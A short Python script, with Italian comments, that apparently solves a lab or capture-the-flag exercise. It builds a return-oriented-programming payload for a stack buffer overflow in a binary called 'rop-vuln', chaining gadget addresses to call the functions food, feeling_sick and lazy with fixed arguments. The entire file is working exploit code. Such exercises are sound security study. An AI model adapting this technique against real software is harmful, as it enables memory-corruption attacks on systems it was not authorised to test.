import os
import struct

#./rop-vuln `cat badfile1` `cat badfile`

#gadget : ROPgadget --binary file --only "pop|ret"
pop_ret = 0x08048512
pop_pop_ret = 0x08048511
pop_pop_pop_ret = 0x08048510
#funzioni
lazy = 0x804849b
food = 0x80484c7
feeling_sick = 0x8048514

payload = "A"*50 #buf[50] nel main
payload += "secret-file"

payload1 = "A"*112 #valore trovato con peda dopo un buffer overflow, poi pattern search che mi ha dato la distanza di EIP
filename_address = 0xbffff16b

#poi bisogna comporre le chiamate: food(0xdeadbeef) - feeling_sick - lazy
payload1 += struct.pack("I", food)
payload1 += struct.pack("I", pop_ret)
payload1 += struct.pack("I", 0xdeadbeef) #valore richiesto nel programma

#(0xd15ea5e, 0x0badf00d)
payload1 += struct.pack("I", feeling_sick)
payload1 += struct.pack("I", pop_pop_pop_ret) #quindi 3 pop
payload1 += struct.pack("I", 0xd15ea5e) #3
payload1 += struct.pack("I", 0x0badf00d) #2
payload1 += struct.pack("I", filename_address) #1

payload1 += struct.pack("I", lazy)

f = open("badfile", "w")
f.write("%s" % payload)
f.close()

f = open("badfile1", "w") #1 e` proprio argv1
f.write("%s" % payload1)
f.close()

